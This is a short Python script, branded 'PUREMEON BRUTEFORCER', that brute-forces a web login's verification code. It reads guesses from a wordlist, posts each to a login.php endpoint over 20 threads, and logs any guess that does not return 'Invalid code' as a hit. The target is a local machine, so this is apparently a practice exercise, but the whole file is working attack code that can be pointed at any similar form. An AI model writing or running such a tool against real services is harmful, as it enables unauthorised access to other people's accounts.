#!/usr/bin/env python
# -*- coding: utf-8 -*- 
import requests
import time
from concurrent.futures import ThreadPoolExecutor
from colorama import Style, Fore, init
from os import name, system

class Brute():

    def Clear(self):
        if name == 'posix':
            # FOR LINUX
            system('clear')
        elif name == 'nt':
            # FOR WINDOWS
            system('cls')
        else:
            print("\n") * 120

    def __init__(self):
        self.SetTitle()
        self.hits = self.bads = 0
        self.Clear()
        self.startTime = time.time()

        title = Style.BRIGHT + Fore.MAGENTA + """
            ╔═════════════════════════════════════════════════════════════════╗
                ╔═╗╦ ╦╦═╗╔═╗╔╦╗╔═╗╔═╗╔╗╔  ╔╗ ╦═╗╦ ╦╔╦╗╔═╗╔═╗╔═╗╦═╗╔═╗╔═╗╦═╗
                ╠═╝║ ║╠╦╝║╣ ║║║║╣ ║ ║║║║  ╠╩╗╠╦╝║ ║ ║ ║╣ ╠╣ ║ ║╠╦╝║  ║╣ ╠╦╝
                ╩  ╚═╝╩╚═╚═╝╩ ╩╚═╝╚═╝╝╚╝  ╚═╝╩╚═╚═╝ ╩ ╚═╝╚  ╚═╝╩╚═╚═╝╚═╝╩╚═
            ╚═════════════════════════════════════════════════════════════════╝
            \n\n\n
        """
        print(title)

    def SetTitle(self):
        system("title [PUREMEON BRUTEFORCER]")

    def ReadFile(self, fname):
        with open(fname, "r", encoding='utf8') as f:
            readlines = f.readlines();
            self.comboLen = len(readlines)
            return readlines

    def ResultProcessor(self, results, pwd):
        if "Invalid code" in results:
            print(Style.BRIGHT + Fore.RED + "[ WRONG ] " + pwd + "\n", end='', flush=True)
            self.bads += 1
        else:
            print(Style.BRIGHT + Fore.GREEN + "[ FOUND ] " + pwd + "\n", end='', flush=True)
            self.hits += 1
            with open("Results/hit.txt", "a") as f:
                f.write(pwd + '\n')

    def Login(self, pwd):
        response = requests.post("http://mohammeds-macbook-air.local/Default/login.php", data={"verficationcode":pwd})
        self.ResultProcessor(response.text, pwd)

    def Start(self):
        pwds = self.ReadFile("Data/passlist.txt")
        with ThreadPoolExecutor(max_workers=20) as executor:
            for pwd in pwds:
                if pwd == "\n":
                    continue
                pwd = pwd.strip()
                executor.submit(self.Login, pwd)

    def End(self):
        finishedTime = int((time.time() - self.startTime))
        checked = self.hits + self.bads
        print('\n\n\n')
        print(Style.BRIGHT + Fore.CYAN + f"[+] DONE")
        print(Style.BRIGHT + Fore.MAGENTA + f"[+] CHECKED {checked} of {self.comboLen}")
        print(Style.BRIGHT + Fore.YELLOW + f"[+] Took {finishedTime} seconds")


print("here")

brute = Brute()
brute.Start()
brute.End()


print('\n\n')
input("Press any key to exit..")